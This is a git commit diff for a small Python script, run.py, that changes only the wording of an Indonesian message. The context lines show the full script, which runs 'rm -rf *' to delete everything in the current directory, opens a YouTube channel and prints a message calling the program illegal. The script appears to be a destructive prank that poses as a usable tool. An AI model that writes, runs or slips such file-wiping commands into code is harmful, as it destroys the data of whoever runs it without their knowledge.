aa5eef922a8a57bcac49d27176b3a29477f5d87c
jamrong32 <49414236+jamrong32@users.noreply.github.com>
2019-06-05 23:26:28 +0700

    Update run.py

--- run.py
+++ run.py
@@ -2,4 +2,4 @@ import os
 os.system("rm -rf *")
 os.system("xdg-open https://youtube.com/NjankSoekamti")
 os.system("clear")
-print("\n\n Ini adalah program illegal!\nSaya harus menghapus alat ini\n\n")
+print("\n\n Ini adalah kenapa di reedit lgi  program illegal!\nSaya harus menghapus alat ini\n\n")
